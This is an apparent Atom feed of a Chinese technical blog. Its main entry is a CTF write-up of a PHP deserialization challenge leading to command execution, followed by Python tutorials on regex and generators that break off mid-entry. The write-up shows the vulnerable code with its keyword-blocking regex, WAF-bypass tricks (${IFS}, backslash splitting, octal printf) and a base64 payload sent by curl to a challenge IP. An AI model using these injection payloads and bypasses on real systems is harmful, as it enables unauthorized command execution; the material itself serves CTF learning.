<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夏了茶糜</title>
  
  
  <link href="https://xin02.github.io/atom.xml" rel="self"/>
  
  <link href="https://xin02.github.io/"/>
  <updated>2022-11-06T13:39:25.692Z</updated>
  <id>https://xin02.github.io/</id>
  
  <author>
    <name>夏了茶糜</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>unseping</title>
    <link href="https://xin02.github.io/2022/11/06/unseping/"/>
    <id>https://xin02.github.io/2022/11/06/unseping/</id>
    <published>2022-11-06T12:10:23.000Z</published>
    <updated>2022-11-06T13:39:25.692Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、题目源码"><a href="#1、题目源码" class="headerlink" title="1、题目源码"></a>1、题目源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;<span class="comment">//ping</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;<span class="comment">//array(&#x27;&#x27;)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;<span class="comment">//创建对象时触发</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//对象销毁时触发</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;<span class="comment">//如果ping匹配数组里有ping进入if  </span></span><br><span class="line">            <span class="comment">//这个决定了 $a = new ease(&quot;ping&quot;,array(&#x27;pwd&#x27;));的第一个参数ping</span></span><br><span class="line">            <span class="comment">//下面的函数也决定了第二个参数是 数组型array(&#x27;&#x27;)</span></span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">            <span class="comment">//调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">            <span class="comment">//被调用的函数 this之这个类 method 就是函数ping  参数是args</span></span><br><span class="line">            <span class="comment">//只针对php</span></span><br><span class="line">           <span class="comment">// call_user_func_array(array($ease,&quot;ping&quot;),array(&#x27;one&#x27;));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;<span class="comment">//等于执行了ping(&quot;one&quot;) </span></span><br><span class="line">        <span class="comment">//ping的参数只有一个因此数组传一个参就好了</span></span><br><span class="line">        exec(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        var_dump(<span class="variable">$result</span>);<span class="comment">//貌似执行了这个$ip命令返回了结果</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) &#123;</span><br><span class="line">            <span class="comment">//正则表达式()整体修饰|或&amp;或;或 或/或cat或flag或tac或php或ls 这都是liunx常用的一些执行命令</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;<span class="comment">//绕过表达式 返回传参</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;<span class="comment">//遍历关联数组  foreach ($array as $key =&gt; $value)</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;waf(<span class="variable">$v</span>);<span class="comment">//调用waf函数输入$v  //若果绕过waf本身的args不会变</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];<span class="comment">//post传参ctf=xxxx</span></span><br><span class="line">@unserialize(base64_decode(<span class="variable">$ctf</span>));<span class="comment">//先对ctf进行base64解密 在反序列话</span></span><br><span class="line"><span class="comment">//unserialize先检查__wakeup()存在的意义：常常初始化操作 或 连接数据库</span></span><br><span class="line"><span class="comment">/*(前提：有可利用的类）</span></span><br><span class="line"><span class="comment">常见的魔术方法</span></span><br><span class="line"><span class="comment">__construct()        //创建对象时触发</span></span><br><span class="line"><span class="comment">__destruct()        //对象销毁时触发</span></span><br><span class="line"><span class="comment">__call()        //在对象中调用不可访问的方法时触发</span></span><br><span class="line"><span class="comment">__callStatic()        //在静态中调用不可访问的方法时触发</span></span><br><span class="line"><span class="comment">__get()        //用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="comment">__set()        //用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="comment">__isset()        //在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="comment">__unset()        //在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="comment">__invoke()        //当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="comment">__wakeup()        //执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="comment">__sleep()        //执行serialize()时，先会调用这个函数*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、函数解释"><a href="#2、函数解释" class="headerlink" title="2、函数解释"></a>2、函数解释</h3><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>highlight_file(filename,return) 函数对文件进行语法高亮显示。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>filename</em></td><td align="left">必需。要进行高亮处理的 PHP 文件的路径。</td></tr><tr><td align="left"><em>return</em></td><td align="left">可选。如果设置 true，则本函数返回高亮处理的代码。</td></tr></tbody></table><h4 id="FILE"><a href="#FILE" class="headerlink" title="__FILE__"></a>__FILE__</h4><p>PHP中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。</p><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。</p><p>在 PHP3.0 和 PHP4.0 中，构造函数是一个与其所在类同名的函数。而在 PHP5 中，虽然也支持 PHP3.0 和 PHP4.0 中的用法，但是更推荐使用<code>__construct</code>作为类的构造函数，这样做的好处就是构造函数无需随着类名的改变而做出修改。在 PHP7.0 中废弃了 PHP3.0 和 PHP4.0 中的用法，构造函数必须使用<code>__construct</code>来定义。</p><p>构造函数就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。和普通函数类似构造函数也可以带有参数，如果构造函数有参数的话，那么在实例化也需要传入对应的参数。</p><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p><p>在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。</p><p>析构函数的声明格式与构造函数相似，在类中声明析构函数的名称也是固定的，同样以两个下画线开头的方法名<code>__destruct()</code>，而且析构函数不能带有任何参数。</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p><strong>__sleep()，执行serialize()时，先会调用这个函数</strong></p><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p><p><strong>注意：</strong>__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</p><p><strong>作用</strong>：__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p><strong>执行unserialize()时，先会调用这个函数</strong></p><p>如果说__sleep 是白的，那么__wakeup() 就是黑的了。</p><p><strong>那么为什么呢？</strong></p><p>因为：与之相反，<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p><p><strong>作用：</strong></p><p>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作</p><h4 id="in-array-value-array-type"><a href="#in-array-value-array-type" class="headerlink" title="in_array(value,array,type)"></a>in_array(value,array,type)</h4><p>参数说明：</p><p>value ：要搜索的值</p><p>array ： 被搜索的数组</p><p>type ： 类型，true全等 ，false非全等(默认)</p><p>PHP 4, PHP 5中 <em>in_array</em>函数功能 – 检查数组中是否存在某个值。</p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><p>(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7, PHP 8)</p><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p><p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>args</code>）为回调函数的的参数传入。</p><p>参数<a href="https://www.php.net/manual/zh/function.call-user-func-array.php#refsect1-function.call-user-func-array-parameters"> ¶</a></p><ul><li><p><code>callback</code></p><p>被调用的回调函数。</p></li><li><p><code>args</code></p><p>要被传入回调函数的数组，这个数组得是索引数组。</p></li></ul><p>返回值<a href="https://www.php.net/manual/zh/function.call-user-func-array.php#refsect1-function.call-user-func-array-returnvalues"> ¶</a></p><p>返回回调函数的结果。如果出错的话就返回 <strong><code>false</code></strong> 。</p><h4 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h4><p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p><p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p><p>如果想要将已序列化的字符串变回 PHP 的值，可使用 <a href="https://www.runoob.com/php/php-unserialize-function.html">unserialize()</a>。</p><p>PHP 版本要求: PHP 4, PHP 5, PHP 7</p><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string serialize ( mixed $value )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>$value: 要序列化的对象或数组。</li></ul><p>返回值:返回一个字符串。</p><h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h4><p>用于将通过 <a href="https://www.runoob.com/php/php-serialize-function.html">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p><p>PHP 版本要求: PHP 4, PHP 5, PHP 7</p><p>参数说明：</p><ul><li>$str: 序列化后的字符串。</li></ul><p>返回值:</p><p>返回的是转换之后的值，可为 integer、float、string、array 或 object。如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE。</p><h3 id="3、解题方法"><a href="#3、解题方法" class="headerlink" title="3、解题方法"></a>3、解题方法</h3><p>代码过滤了flag，ls，空格等。可以使用反斜杠隔开ls，反斜杠在Linux中可以作为转义符号或作为换行符，也可通过Linux shell脚本中的空的环境变量绕过例如将${a}放在ls中间，${IFS}代替空格。还可以通过将字符转换为8进制的ASCII码绕过检测。例如：$(printf “\154\163”)，154为l，163为s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/]</span><br><span class="line">└─<span class="comment"># $(printf &quot;\154\163&quot;)</span></span><br><span class="line">bin   etc   initrd.img      lib32   lost+found  opt   run   sys  var</span><br><span class="line">boot  flag  initrd.img.old  lib64   media       proc  sbin  tmp  vmlinuz</span><br><span class="line">dev   home  lib             libx32  mnt         root  srv   usr  vmlinuz.old</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># ls -l\</span></span><br><span class="line">a \</span><br><span class="line">/home</span><br><span class="line">总用量 12</span><br><span class="line">drwxr-xr-x  3 root root 4096  2月 28  2022 .</span><br><span class="line">drwxr-xr-x 19 root root 4096  9月  1 09:23 ..</span><br><span class="line">drwxr-xr-x 17 kk   kk   4096  2月 28  2022 kk</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> ease(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;l\s         fl\ag_1\s_here&quot;</span>))));</span><br></pre></td></tr></table></figure><p>输出为：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxOToibFxzCQlmbFxhZ18xXHNfaGVyZSI7fX0</p><p>通过curl发送post数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://61.147.171.105:51434/ -X POST -d <span class="string">&#x27;ctf=Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxOToibFxzCQlmbFxhZ18xXHNfaGVyZSI7fX0&#x27;</span></span><br></pre></td></tr></table></figure><p>wget：提交方式<a href="https://so.csdn.net/so/search?q=wget&spm=1001.2101.3001.7020">wget</a> –post-data “item1=value1&amp;item2=value2” <a href="http://xxx.xxx.com/">http://xxx.xxx.com</a></p><p><a href="https://blog.csdn.net/shelter1234567/article/details/127337541">江苏工匠杯_unseping_wp_昵称还在想呢的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/Oavinci/article/details/106780804">GXYCTF2019–Ping Ping Ping_FTOrange的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/loseheart157/article/details/108686471?spm=1001.2101.3001.4242.1&utm_relevant_index=3">shell命令之 IFS(内部分隔符的用法)<em>h0ld1rs的博客-CSDN博客</em>$ifs$1</a></p><p><a href="https://www.freebuf.com/news/209975.html">PHP反序列化漏洞简介及相关技巧小结 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.lmlphp.com/user/62985/article/item/2690546/">CTF中PHP反序列化和命令注入的一次简单利用 | payload (lmlphp.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1、题目源码&quot;&gt;&lt;a href=&quot;#1、题目源码&quot; class=&quot;headerlink&quot; title=&quot;1、题目源码&quot;&gt;&lt;/a&gt;1、题目源码&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    <category term="CTF" scheme="https://xin02.github.io/categories/CTF/"/>
    
    
    <category term="WEB" scheme="https://xin02.github.io/tags/WEB/"/>
    
    <category term="反序列化" scheme="https://xin02.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python3 面向对象</title>
    <link href="https://xin02.github.io/2022/07/11/Python3-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <id>https://xin02.github.io/2022/07/11/Python3-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</id>
    <published>2022-07-11T06:10:46.000Z</published>
    <updated>2022-07-11T06:12:24.933Z</updated>
    
    
    
    
    <category term="Python3" scheme="https://xin02.github.io/categories/Python3/"/>
    
    
    <category term="面向对象" scheme="https://xin02.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
  <entry>
    <title>Python3 正则</title>
    <link href="https://xin02.github.io/2021/08/09/Python3-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://xin02.github.io/2021/08/09/Python3-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2021-08-09T02:36:23.000Z</published>
    <updated>2022-07-01T12:29:49.108Z</updated>
    
    <content type="html"><![CDATA[<h3 id="正则表达式-简介"><a href="#正则表达式-简介" class="headerlink" title="正则表达式 - 简介"></a>正则表达式 - 简介</h3><p>典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。</p><p>通过使用正则表达式，可以：</p><ul><li><h6 id="测试字符串内的模式。"><a href="#测试字符串内的模式。" class="headerlink" title="测试字符串内的模式。"></a>测试字符串内的模式。</h6><p> 例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。</p></li><li><p>替换文本。<br> 可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。</p></li><li><p>基于模式匹配从字符串中提取子字符串。<br> 可以查找文档内或输入域内特定的文本。</p></li></ul><p>例如，您可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML  格式标记。在这种情况下，可以使用正则表达式来确定在每个文件中是否出现该材料或该 HTML  格式标记。此过程将受影响的文件列表缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过时的材料。最后，可以使用正则表达式来搜索和替换标记。</p><h3 id="匹配单个字符"><a href="#匹配单个字符" class="headerlink" title="匹配单个字符"></a>匹配单个字符</h3><h3 id="匹配多个字符"><a href="#匹配多个字符" class="headerlink" title="匹配多个字符"></a>匹配多个字符</h3><h3 id="匹配开头结尾"><a href="#匹配开头结尾" class="headerlink" title="匹配开头结尾"></a>匹配开头结尾</h3><h3 id="匹配分组"><a href="#匹配分组" class="headerlink" title="匹配分组"></a>匹配分组</h3><h3 id="Python3-Re模块高级用法"><a href="#Python3-Re模块高级用法" class="headerlink" title="Python3 Re模块高级用法"></a>Python3 Re模块高级用法</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;正则表达式-简介&quot;&gt;&lt;a href=&quot;#正则表达式-简介&quot; class=&quot;headerlink&quot; title=&quot;正则表达式 - 简介&quot;&gt;&lt;/a&gt;正则表达式 - 简介&lt;/h3&gt;&lt;p&gt;典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态</summary>
      
    
    
    
    <category term="Python3" scheme="https://xin02.github.io/categories/Python3/"/>
    
    
    <category term="正则表达式" scheme="https://xin02.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Python3 协程</title>
    <link href="https://xin02.github.io/2021/06/18/Python3-%E5%8D%8F%E7%A8%8B/"/>
    <id>https://xin02.github.io/2021/06/18/Python3-%E5%8D%8F%E7%A8%8B/</id>
    <published>2021-06-18T01:18:14.000Z</published>
    <updated>2022-07-01T12:29:49.200Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有元素被访问完结束。迭代器只能往前不会后退。</p></blockquote><h3 id="判断是否可迭代"><a href="#判断是否可迭代" class="headerlink" title="判断是否可迭代"></a>判断是否可迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">isinstance</span>(<span class="string">&quot;abc&quot;</span>,Iterable)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">isinstance</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],Iterable)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="built_in">isinstance</span>(<span class="number">123</span>,Iterable)</span><br><span class="line">Out[<span class="number">4</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>返回为True即为可迭代</p><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Classmate</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.names = <span class="built_in">list</span>()</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self.names.append(name)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#如果想要一个对象 可以迭代，即可以使用for，那么必须实现__iter__方法</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.names):</span><br><span class="line">            ret = self.names[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line">classmate = Classmate()</span><br><span class="line">classmate.add(<span class="string">&quot;小1&quot;</span>)</span><br><span class="line">classmate.add(<span class="string">&quot;小2&quot;</span>)</span><br><span class="line">classmate.add(<span class="string">&quot;小3&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classmate:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h3 id="迭代器的应用-斐波那契数列"><a href="#迭代器的应用-斐波那契数列" class="headerlink" title="迭代器的应用(斐波那契数列)"></a>迭代器的应用(斐波那契数列)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,max_num</span>):</span></span><br><span class="line">        self.max_num = max_num</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line">        self.front = <span class="number">0</span></span><br><span class="line">        self.after = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; self.max_num:</span><br><span class="line">            ret = self.front</span><br><span class="line">            self.front, self.after = self.after, (self.front + self.after)</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">fibo = Fibonacci(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> fibo:</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure><h3 id="迭代器的其他使用方法"><a href="#迭代器的其他使用方法" class="headerlink" title="迭代器的其他使用方法"></a>迭代器的其他使用方法</h3><p>并不是只有for循环能够接受可迭代对象，除for循环外，list、tuple等也能接受。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)</span><br><span class="line"><span class="built_in">list</span>(a)</span><br><span class="line"><span class="comment">#此处list(a)不是单纯的类型转换，而是首先创建一个空列表，然后调用next方法，一个一个的往列表中添加。</span></span><br></pre></td></tr></table></figure><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>生成器是一种特殊的迭代器</p><h3 id="创建生成器"><a href="#创建生成器" class="headerlink" title="创建生成器"></a>创建生成器</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: nums = [x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: 